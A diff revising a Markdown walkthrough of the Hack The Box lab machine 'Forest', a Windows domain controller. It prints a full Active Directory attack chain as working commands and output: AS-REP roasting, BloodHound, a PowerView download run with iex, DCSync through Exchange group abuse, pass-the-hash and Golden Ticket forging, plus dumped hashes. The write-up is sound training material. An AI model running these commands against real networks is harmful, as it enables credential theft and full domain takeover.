@@ -11,9 +11,21 @@
 
 > Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes.
 
+#### Skills Required
+
+- Enumeration
+
+#### Skills Learned
+
+- [ASREPRoasting](https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/)
+- Enumeration with Bloodhound
+- [DCSync Attack](https://blog.netwrix.com/2021/11/30/what-is-dcsync-an-introduction/)
+- [Golden Ticket Attack](https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/golden-ticket-attack/)
+
 #### Tools Used
 
 - bloodhound
+- bloodhound-python
 - crackmapexec
 - evil-winrm
 - impacket-GetNPUsers
@@ -21,12 +33,12 @@
 - impacket-secretsdump
 - impacket-smbserver
 - impacket-ticketer
-- kerbrute
 - john
+- kerbrute
 - ldapsearch
 - nmap
-- powerview.ps1 (PowerSploit)
-- sharphound.ps1
+- PowerView.ps1
+- SharpHound.ps1
 
 #### Machine Writeup
 
@@ -50,7 +62,7 @@ tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
 10.10.10.161 is alive ←
 ```
 
-`nmap -Pn -sS -sV -p- -T4 10.10.10.161`:
+`sudo nmap -Pn -sS -sV -p- -T4 10.10.10.161`:
 ```
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-23 12:42 CEST
 Nmap scan report for 10.10.10.161
@@ -92,18 +104,15 @@ Nmap done: 1 IP address (1 host up) scanned in 819.89 seconds
 SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) ←
 ```
 
-<❌ Failed Step>
-
 `crackmapexec smb 10.10.10.161 -u '' -p '' --shares`:
 ```
 SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
 SMB         10.10.10.161    445    FOREST           [+] htb.local\: ←
 SMB         10.10.10.161    445    FOREST           [-] Error enumerating shares: STATUS_ACCESS_DENIED ←
 ```
+❌
 
-</❌ Failed Step>
-
-`nmap -Pn -sS --script=ldap-rootdse -p389 10.10.10.161`:
+`sudo nmap -Pn -sS --script=ldap-rootdse -p389 10.10.10.161`:
 ```
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-23 12:47 CEST
 Nmap scan report for FOREST.htb.local (10.10.10.161)
@@ -210,9 +219,9 @@ Service Info: Host: FOREST; OS: Windows
 Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
 ```
 
-`echo -e '10.10.10.161\tFOREST.htb.local FOREST htb.local' | tee -a /etc/hosts`:
+`echo -e '10.10.10.161\tforest.htb.local forest htb.local' | tee -a /etc/hosts`:
 ```
-10.10.10.161    FOREST.htb.local FOREST htb.local ←
+10.10.10.161    forest.htb.local forest htb.local ←
 ```
 
 `crackmapexec smb 10.10.10.161 -d 'htb.local' -u '' -p '' --users`:
@@ -225,7 +234,7 @@ SMB         10.10.10.161    445    FOREST           htb.local\Administrator     
 SMB         10.10.10.161    445    FOREST           htb.local\Guest                          Built-in account for guest access to the computer/domain
 SMB         10.10.10.161    445    FOREST           htb.local\krbtgt                         Key Distribution Center Service Account
 SMB         10.10.10.161    445    FOREST           htb.local\DefaultAccount                 A user account managed by the system.
-SMB         10.10.10.161    445    FOREST           htb.local\$331000-VK4ADACQNUCA           
+SMB         10.10.10.161    445    FOREST           htb.local\$331000-VK4ADACQNUCA
 
 [...]
 
@@ -285,10 +294,73 @@ userPrincipalName: mark@htb.local ←
 
 </🔄 Alternative Step>
 
-`crackmapexec smb 10.10.10.161 -d 'htb.local' -u '' -p '' --users > ./out.txt`
-
-`cat ./out.txt | tail -n 5 | awk '{print $5}' | cut -d '\' -f2 | tee ./domain_users.txt`:
+`crackmapexec smb 10.10.10.161 -d 'htb.local' -u '' -p '' --users`:
 ```
+SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.161    445    FOREST           [+] htb.local\: 
+SMB         10.10.10.161    445    FOREST           [*] Trying to dump local users with SAMRPC protocol
+SMB         10.10.10.161    445    FOREST           [+] Enumerated domain user(s)
+SMB         10.10.10.161    445    FOREST           htb.local\Administrator                  Built-in account for administering the computer/domain
+SMB         10.10.10.161    445    FOREST           htb.local\Guest                          Built-in account for guest access to the computer/domain
+SMB         10.10.10.161    445    FOREST           htb.local\krbtgt                         Key Distribution Center Service Account
+SMB         10.10.10.161    445    FOREST           htb.local\DefaultAccount                 A user account managed by the system.
+SMB         10.10.10.161    445    FOREST           htb.local\$331000-VK4ADACQNUCA
+SMB         10.10.10.161    445    FOREST           htb.local\SM_2c8eef0a09b545acb
+SMB         10.10.10.161    445    FOREST           htb.local\SM_ca8c2ed5bdab4dc9b
+SMB         10.10.10.161    445    FOREST           htb.local\SM_75a538d3025e4db9a
+SMB         10.10.10.161    445    FOREST           htb.local\SM_681f53d4942840e18
+SMB         10.10.10.161    445    FOREST           htb.local\SM_1b41c9286325456bb
+SMB         10.10.10.161    445    FOREST           htb.local\SM_9b69f1b9d2cc45549
+SMB         10.10.10.161    445    FOREST           htb.local\SM_7c96b981967141ebb
+SMB         10.10.10.161    445    FOREST           htb.local\SM_c75ee099d0a64c91b
+SMB         10.10.10.161    445    FOREST           htb.local\SM_1ffab36a2f5f479cb
+SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxc3d7722
+SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxfc9daad
+SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxc0a90c9
+SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox670628e
+SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox968e74d
+SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox6ded678
+SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox83d6781
+SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxfd87238
+SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxb01ac64
+SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox7108a4e
+SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox0659cc1
+SMB         10.10.10.161    445    FOREST           htb.local\sebastien
+SMB         10.10.10.161    445    FOREST           htb.local\lucinda
+SMB         10.10.10.161    445    FOREST           htb.local\svc-alfresco
+SMB         10.10.10.161    445    FOREST           htb.local\andy
+SMB         10.10.10.161    445    FOREST           htb.local\mark
+SMB         10.10.10.161    445    FOREST           htb.local\santi 
+```
+
+`crackmapexec smb 10.10.10.161 -d 'htb.local' -u '' -p '' --users | awk '{ print $5 }' | awk -F '\' '{ print $2 }' | awk NF | tee ./domain_users.txt`:
+```
+Administrator
+Guest
+krbtgt
+DefaultAccount
+$331000-VK4ADACQNUCA
+SM_2c8eef0a09b545acb
+SM_ca8c2ed5bdab4dc9b
+SM_75a538d3025e4db9a
+SM_681f53d4942840e18
+SM_1b41c9286325456bb
+SM_9b69f1b9d2cc45549
+SM_7c96b981967141ebb
+SM_c75ee099d0a64c91b
+SM_1ffab36a2f5f479cb
+HealthMailboxc3d7722
+HealthMailboxfc9daad
+HealthMailboxc0a90c9
+HealthMailbox670628e
+HealthMailbox968e74d
+HealthMailbox6ded678
+HealthMailbox83d6781
+HealthMailboxfd87238
+HealthMailboxb01ac64
+HealthMailbox7108a4e
+HealthMailbox0659cc1
+sebastien
 lucinda
 svc-alfresco
 andy
@@ -309,22 +381,33 @@ Version: dev (n/a) - 10/23/24 - Ronnie Flathers @ropnop
 2024/10/23 13:32:49 >  Using KDC(s):
 2024/10/23 13:32:49 >   10.10.10.161:88
 
-2024/10/23 13:32:49 >  [+] VALID USERNAME:       andy@htb.local ←
-2024/10/23 13:32:49 >  [+] VALID USERNAME:       santi@htb.local ←
-2024/10/23 13:32:49 >  [+] VALID USERNAME:       mark@htb.local ←
-2024/10/23 13:32:49 >  [+] VALID USERNAME:       lucinda@htb.local ←
-2024/10/23 13:32:49 >  [+] svc-alfresco has no pre auth required. Dumping hash to crack offline: ←
-$krb5asrep$18$svc-alfresco@HTB.LOCAL:7fd3b4ce858ec556d2a517930b496a42$2fb907468075b4a5f4ce4008a8176a9126eef0563beff3174f96459a74386e118c9f9a321122c9eac36c5e6c144231d7a4f3f5f6b4a319563c495a08b06636abb48d591367a5f407654eecdb98b0a641bb00c2babd6259f47dc19cd2780dc0ada48e50b247e05b37593a73a233810f20f2ba5e03024aff32dcd1fe995244e60df82a46c342637c3be35a1787b093b4527466d619382bc1ff518d0f6d48933007fb46ded59e8792608f42e18d11485564cd862eaa6b823dc26d9d23897600403995ef432668252474b70bec0c8e52f3fd3096b71830be34f98b7fd0729e45e42e58a661ede51753a8558331cf9049f67719017a933f5ee9783321                                                                                              
-2024/10/23 13:32:49 >  [+] VALID USERNAME:       svc-alfresco@htb.local ←
-2024/10/23 13:32:49 >  Done! Tested 5 usernames (5 valid) in 0.115 seconds ←
+2024/11/06 15:00:30 >  [+] VALID USERNAME:       Administrator@htb.local
+2024/11/06 15:00:30 >  [+] VALID USERNAME:       HealthMailbox6ded678@htb.local
+2024/11/06 15:00:30 >  [+] VALID USERNAME:       HealthMailboxc0a90c9@htb.local
+2024/11/06 15:00:30 >  [+] VALID USERNAME:       HealthMailbox968e74d@htb.local
+2024/11/06 15:00:30 >  [+] VALID USERNAME:       HealthMailbox670628e@htb.local
+2024/11/06 15:00:30 >  [+] VALID USERNAME:       HealthMailboxfc9daad@htb.local
+2024/11/06 15:00:30 >  [+] VALID USERNAME:       HealthMailboxc3d7722@htb.local
+2024/11/06 15:00:30 >  [+] VALID USERNAME:       HealthMailbox83d6781@htb.local
+2024/11/06 15:00:30 >  [+] VALID USERNAME:       HealthMailboxfd87238@htb.local
+2024/11/06 15:00:30 >  [+] VALID USERNAME:       HealthMailboxb01ac64@htb.local
+2024/11/06 15:00:30 >  [+] VALID USERNAME:       sebastien@htb.local
+2024/11/06 15:00:30 >  [+] VALID USERNAME:       HealthMailbox7108a4e@htb.local
+2024/11/06 15:00:30 >  [+] VALID USERNAME:       HealthMailbox0659cc1@htb.local
+2024/11/06 15:00:30 >  [+] VALID USERNAME:       lucinda@htb.local
+2024/11/06 15:00:30 >  [+] VALID USERNAME:       andy@htb.local
+2024/11/06 15:00:30 >  [+] VALID USERNAME:       mark@htb.local
+2024/11/06 15:00:30 >  [+] svc-alfresco has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$18$svc-alfresco@HTB.LOCAL:7fd3b4ce858ec556d2a517930b496a42$2fb907468075b4a5f4ce4008a8176a9126eef0563beff3174f96459a74386e118c9f9a321122c9eac36c5e6c144231d7a4f3f5f6b4a319563c495a08b06636abb48d591367a5f407654eecdb98b0a641bb00c2babd6259f47dc19cd2780dc0ada48e50b247e05b37593a73a233810f20f2ba5e03024aff32dcd1fe995244e60df82a46c342637c3be35a1787b093b4527466d619382bc1ff518d0f6d48933007fb46ded59e8792608f42e18d11485564cd862eaa6b823dc26d9d23897600403995ef432668252474b70bec0c8e52f3fd3096b71830be34f98b7fd0729e45e42e58a661ede51753a8558331cf9049f67719017a933f5ee9783321 ←                                                                                                                                                                                      
+2024/11/06 15:00:30 >  [+] VALID USERNAME:       svc-alfresco@htb.local
+2024/11/06 15:00:30 >  [+] VALID USERNAME:       santi@htb.local
+2024/11/06 15:00:30 >  Done! Tested 31 usernames (18 valid) in 0.310 seconds
 ```
 
 `vim ./asrep_hash.txt`:
 ```
 $krb5asrep$18$svc-alfresco@HTB.LOCAL:7fd3b4ce858ec556d2a517930b496a42$2fb907468075b4a5f4ce4008a8176a9126eef0563beff3174f96459a74386e118c9f9a321122c9eac36c5e6c144231d7a4f3f5f6b4a319563c495a08b06636abb48d591367a5f407654eecdb98b0a641bb00c2babd6259f47dc19cd2780dc0ada48e50b247e05b37593a73a233810f20f2ba5e03024aff32dcd1fe995244e60df82a46c342637c3be35a1787b093b4527466d619382bc1ff518d0f6d48933007fb46ded59e8792608f42e18d11485564cd862eaa6b823dc26d9d23897600403995ef432668252474b70bec0c8e52f3fd3096b71830be34f98b7fd0729e45e42e58a661ede51753a8558331cf9049f67719017a933f5ee9783321
 ```
-
-<❌ Failed Step>
 
 `john --wordlist=/usr/share/wordlists/rockyou.txt ./asrep_hash.txt`:
 ```
@@ -335,8 +418,10 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 0g 0:00:00:09 DONE (2024-10-23 13:41) 0g/s 1453Kp/s 1453Kc/s 1453KC/s  0841079575..*7¡Vamos!
 Session completed. 
 ```
+❌
 
-</❌ Failed Step>
+The `GetNPUsers.py` script from `Impacket` can be used to request a TGT ticket and dump the
+hash.
 
 `impacket-GetNPUsers -dc-ip 10.10.10.161 'htb.local/' -usersfile ./domain_users.txt`:
 ```
@@ -348,6 +433,8 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:da4a1e13d7834e57d2b4c354155ce107$97c8b39666
 [-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
 [-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
+
+Let's copy the hash to a file, and attempt to crack it using JtR.
 
 `vim ./asrep_hash.txt`:
 ```
@@ -421,7 +508,7 @@ htb\svc-alfresco ←
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
--ar---       10/23/2024   5:34 AM             34 user.txt
+-ar---       10/23/2024   5:34 AM             34 user.txt ←
 ```
 
 `type ./user.txt`:
@@ -453,7 +540,7 @@ NT AUTHORITY\NETWORK                       Well-known group S-1-5-2             
 NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
 NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
 HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
-HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
+HTB\Service Accounts ←                     Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
 NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
 Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
 
@@ -475,6 +562,37 @@ User claims unknown.
 
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
+
+`net user svc-alfresco`:
+```
+User name                    svc-alfresco
+Full Name                    svc-alfresco
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/24/2024 1:17:04 AM
+Password expires             Never
+Password changeable          10/25/2024 1:17:04 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   10/23/2024 5:40:10 AM
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users         *Service Accounts ←
+The command completed successfully.
+```
+
+Let's use bloodhound to visualise the domain and look for privilege escalation paths.
 
 ![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
@@ -503,7 +621,7 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
 `cd ../appdata/local/temp`
 
-`mkdir ./a9b7c6d2d1c0f1c8b9e3d8c9a1`
+`mkdir ./a9b7c6d2d1c0f1c8b9e3d8c9a1a6b8d9f0c6c5c3a3b1`
 
 `cd ./a9*`
 
@@ -511,7 +629,7 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
 `cat ./sh.ps1 | grep "function"`:
 ```
-function Invoke-BloodHound
+function Invoke-BloodHound ←
         for the SharpHound executable and passed in via reflection. The appropriate function
 ```
 
@@ -520,7 +638,7 @@ function Invoke-BloodHound
 function Invoke-BloodHound
         PS C:\> Invoke-BloodHound
         PS C:\> Invoke-BloodHound -Loop -LoopInterval 00:01:00 -LoopDuration 00:10:00
-        PS C:\> Invoke-BloodHound -CollectionMethods All
+        PS C:\> Invoke-BloodHound -CollectionMethods All ←
         PS C:\> Invoke-BloodHound -CollectionMethods DCOnly -NoSaveCache -RandomizeFilenames -EncryptZip
 ```
 
@@ -547,7 +665,7 @@ Closing writers
  0 machine sid mappings.
  2 sid to domain mappings.
  0 global catalog mappings.
-2024-10-23T07:34:39.0482747-07:00|INFORMATION|SharpHound Enumeration Completed at 7:34 AM on 10/23/2024! Happy Graphing!
+2024-10-23T07:34:39.0482747-07:00|INFORMATION|SharpHound Enumeration Completed at 7:34 AM on 10/23/2024! Happy Graphing! ←
 ```
 
 `dir ./`:
@@ -562,6 +680,55 @@ Mode                LastWriteTime         Length Name
 ```
 
 `copy ./*.zip \\10.10.16.7\smbshare\bh.zip`
+
+<🔄 Alternative Step>
+
+`bloodhound-python -d 'htb.local' -dc 'htb.local' -ns 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' -c All`:
+```
+INFO: Found AD domain: htb.local
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: htb.local
+INFO: Kerberos auth to LDAP failed, trying NTLM
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Connecting to LDAP server: htb.local
+INFO: Kerberos auth to LDAP failed, trying NTLM
+INFO: Found 33 users ←
+INFO: Found 76 groups ←
+INFO: Found 2 gpos
+INFO: Found 15 ous
+INFO: Found 20 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: EXCH01.htb.local
+INFO: Querying computer: FOREST.htb.local
+INFO: Done in 00M 25S
+```
+
+`ls -l ./*.json`:
+```   
+-rw-rw-r-- 1 kali kali   7034 Nov  6 16:53 ./20241106165258_computers.json
+-rw-rw-r-- 1 kali kali  27202 Nov  6 16:53 ./20241106165258_containers.json
+-rw-rw-r-- 1 kali kali   4197 Nov  6 16:53 ./20241106165258_domains.json
+-rw-rw-r-- 1 kali kali   3092 Nov  6 16:53 ./20241106165258_gpos.json
+-rw-rw-r-- 1 kali kali 146619 Nov  6 16:53 ./20241106165258_groups.json
+-rw-rw-r-- 1 kali kali  22432 Nov  6 16:53 ./20241106165258_ous.json
+-rw-rw-r-- 1 kali kali  99435 Nov  6 16:53 ./20241106165258_users.json
+```
+
+`zip ./bh.zip ./*.json`:
+```
+  adding: 20241106165258_computers.json (deflated 83%)
+  adding: 20241106165258_containers.json (deflated 93%)
+  adding: 20241106165258_domains.json (deflated 79%)
+  adding: 20241106165258_gpos.json (deflated 82%)
+  adding: 20241106165258_groups.json (deflated 95%)
+  adding: 20241106165258_ous.json (deflated 93%)
+  adding: 20241106165258_users.json (deflated 96%)
+```
+
+</🔄 Alternative Step>
 
 ![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
@@ -583,6 +750,10 @@ Mode                LastWriteTime         Length Name
 
 `Analysis` > `Shortest Paths` > `Shortest Paths to High Value Targets` > `Select a Domain: HTB.LOCAL`
 
+It's found that `svc-alfresco` is a member of various groups through nested membership. 
+One of the nested groups is found to be `Account Operators`, which is a privileged AD group.
+According to the [documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-accountoperators), members of the `Account Operator`s group are allowed create and modify users and add them to non-protected groups.
+
 `Graph`:
 ```
 SVC-ALFRESCO ---(MemberOf)--- SERVICE ACCOUNTS ---(MemberOf)--- PRIVILEGED IT ACCOUNTS ---(MemberOf)--- ACCOUNT OPERATORS
@@ -593,6 +764,10 @@ ACCOUNT OPERATORS ---(GenericAll)--- EXCHANGE WINDOWS PERMISSIONS ---(WriteDacl)
 ```
 HTB.LOCAL ---(DSync)--- DOMAIN ADMINS
 ```
+
+One of the paths shows that the `Exchange Windows Permissions` group has `WriteDacl`
+privileges on the Domain. The `WriteDACL` privilege gives a user the ability to add ACLs to an
+object. This means that we can add a user to this group and give them `DCSync` privileges.
 
 `GenericAll`:
 ```
@@ -687,6 +862,8 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 ![Victim: svc-alfresco](https://custom-icon-badges.demolab.com/badge/Victim-svc%2D-alfresco-64b5f6?logo=windows11&logoColor=white)
 
+Let's add a new user to `Exchange Windows Permissions` group.
+
 `net user`:
 ```
 User accounts for \\
@@ -751,36 +928,36 @@ Members ←
 The command completed successfully.
 ```
 
-`net user svc-alfresco`:
-```
-User name                    svc-alfresco
-Full Name                    svc-alfresco
-Comment
-User's comment
-Country/region code          000 (System Default)
-Account active               Yes
-Account expires              Never
-
-Password last set            10/24/2024 1:17:04 AM
-Password expires             Never
-Password changeable          10/25/2024 1:17:04 AM
-Password required            Yes
-User may change password     Yes
-
-Workstations allowed         All
-Logon script
-User profile
-Home directory
-Last logon                   10/23/2024 5:40:10 AM
-
-Logon hours allowed          All
-
-Local Group Memberships
-Global Group memberships     *Domain Users         *Service Accounts ←
-The command completed successfully.
-```
-
 `iex(New-Object Net.WebClient).DownloadString("http://10.10.16.7/pv.ps1")`
+
+`menu`:
+```
+   ,.   (   .      )               "            ,.   (   .      )       .   
+  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
+.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
+_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
+\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
+ |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
+ |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
+/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
+        \/                               \/          \/       \/         \/
+
+       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
+
+[+] Add-DomainAltSecurityIdentity
+[+] Add-DomainGroupMember ←
+[+] Add-DomainObjectAcl
+[+] Add-RemoteConnection
+
+[...]
+
+[+] Bypass-4MSI
+[+] services
+[+] upload
+[+] download
+[+] menu
+[+] exit
+```
 
 `Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members 'hacker'`
 
@@ -807,7 +984,7 @@ MemberSID               : S-1-5-21-3072663084-364016917-1341370565-1119
 
 `net user hacker`:
 ```
-User name                    hacker
+User name                    hacker ←
 Full Name
 Comment
 User's comment
@@ -815,9 +992,9 @@ Country/region code          000 (System Default)
 Account active               Yes
 Account expires              Never
 
-Password last set            10/24/2024 1:13:54 AM
+Password last set            11/6/2024 7:25:28 AM
 Password expires             Never
-Password changeable          10/25/2024 1:13:54 AM
+Password changeable          11/7/2024 7:25:28 AM
 Password required            Yes
 User may change password     Yes
 
@@ -830,9 +1007,11 @@ Last logon                   Never
 Logon hours allowed          All
 
 Local Group Memberships
-Global Group memberships     *Exchange Windows Perm*Domain Users
+Global Group memberships     *Exchange Windows Perm*Domain Users ←
 The command completed successfully.
 ```
+
+Next, we can use the `Add-DomainObjectAcl` with `hacker`'s credentials, and give him DCSync rights.
 
 `$SecPassword = ConvertTo-SecureString 'H4ck3d!' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('htb.local\hacker', $SecPassword)`
 
@@ -845,6 +1024,8 @@ The command completed successfully.
 SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
 SMB         10.10.10.161    445    FOREST           [+] htb.local\hacker:H4ck3d! ← 
 ```
+
+The `secretsdump` script from `Impacket` can now be run as `hacker`, and used to reveal the NTLM hashes for all domain users.
 
 `impacket-secretsdump -dc-ip 10.10.10.161 'htb.local/hacker:H4ck3d!@10.10.10.161'`:
 ```
@@ -914,13 +1095,15 @@ EXCH01$:des-cbc-md5:8c45f44c16975129
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8::: ←
 ```
 
-`crackmapexec smb 10.10.10.161 -u 'administrator' -H 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6'`:
+The obtained Domain Admin hash can be used to login via `psexec`.
+
+`crackmapexec smb 10.10.10.161 -u 'administrator' -H ':32693b11e6aa90eb43d32c72a07ceea6'`:
 ```
 SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
 SMB         10.10.10.161    445    FOREST           [+] htb.local\administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!) ←
 ```
 
-`crackmapexec smb 10.10.10.161 -u 'administrator' -H 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6' --shares`:
+`crackmapexec smb 10.10.10.161 -u 'administrator' -H ':32693b11e6aa90eb43d32c72a07ceea6' --shares`:
 ```
 SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
 SMB         10.10.10.161    445    FOREST           [+] htb.local\administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)
@@ -934,7 +1117,7 @@ SMB         10.10.10.161    445    FOREST           NETLOGON        READ,WRITE  
 SMB         10.10.10.161    445    FOREST           SYSVOL          READ            Logon server share
 ```
 
-`crackmapexec smb 10.10.10.161 -u 'administrator' -H 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6' -x 'whoami'`:
+`crackmapexec smb 10.10.10.161 -u 'administrator' -H ':32693b11e6aa90eb43d32c72a07ceea6' -x 'whoami'`:
 ```
 SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
 SMB         10.10.10.161    445    FOREST           [+] htb.local\administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)
@@ -942,7 +1125,7 @@ SMB         10.10.10.161    445    FOREST           [+] Executed command via wmi
 SMB         10.10.10.161    445    FOREST           htb\administrator ←
 ```
 
-`impacket-psexec 'htb.local/administrator@10.10.10.161' -hashes 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6'`:
+`impacket-psexec 'htb.local/administrator@10.10.10.161' -hashes ':32693b11e6aa90eb43d32c72a07ceea6'`:
 ```
 Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
 
@@ -1068,7 +1251,7 @@ MemberSID               : S-1-5-21-3072663084-364016917-1341370565-500
 
 ![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
-`crackmapexec winrm 10.10.10.161 -u 'administrator' -H 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6'`:
+`crackmapexec winrm 10.10.10.161 -u 'administrator' -H ':32693b11e6aa90eb43d32c72a07ceea6'`:
 ```
 SMB         10.10.10.161    5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
 HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
@@ -1187,6 +1370,8 @@ SystemsContainer                   : CN=System,DC=htb,DC=local
 UsersContainer                     : CN=Users,DC=htb,DC=local
 ```
 
+Following the logic of a **Golden Ticket** attack, we can forge a ticket on behalf of the user `Administrator` by leveraging the hash of the `krbtgt` account. Using the `ticketer` tool from the `impacket` suite, we can locally create a Kerberos Ticket Granting Ticket (TGT), bypassing the need to interact with the remote Kerberos service for a Service Ticket request. This approach provides us with broad access to the domain, as the `krbtgt` hash allows us to authenticate as any user within the domain.
+
 ![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
 `cat ./krbtgt.txt`:
@@ -1212,37 +1397,29 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 [*] Saving ticket in h4x0r.ccache ←
 ```
 
-`export KRB5CCNAME=h4x0r.ccache`
-
-<❌ Failed Step>
-
-`impacket-psexec 'htb.local/h4x0r@10.10.10.161' -k -no-pass`:
+`KRB5CCNAME=h4x0r.ccache impacket-psexec 'htb.local/h4x0r@10.10.10.161' -k -no-pass`:
 ```
 Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
 
 [-] [Errno Connection error (HTB.LOCAL:88)] [Errno -2] Name or service not known ←
 ```
+❌
 
-</❌ Failed Step>
-
-<❌ Failed Step>
-
-`impacket-psexec 'htb.local/h4x0r@forest' -k -no-pass`:
+`KRB5CCNAME=h4x0r.ccache impacket-psexec 'htb.local/h4x0r@forest.htb.local' -k -no-pass`:
 ```
 Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
 
 [-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 ```
+❌
 
-</❌ Failed Step>
-
-`ntpdate 10.10.10.161`:
+`sudo ntpdate 10.10.10.161`:
 ```
 2024-10-24 15:38:32.723856 (+0200) +408.084919 +/- 0.024939 10.10.10.161 s1 no-leap
 CLOCK: time stepped by 408.084919
 ```
 
-`impacket-psexec 'htb.local/h4x0r@forest' -k -no-pass`:
+`KRB5CCNAME=h4x0r.ccache impacket-psexec 'htb.local/h4x0r@forest' -k -no-pass`:
 ```
 Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
 
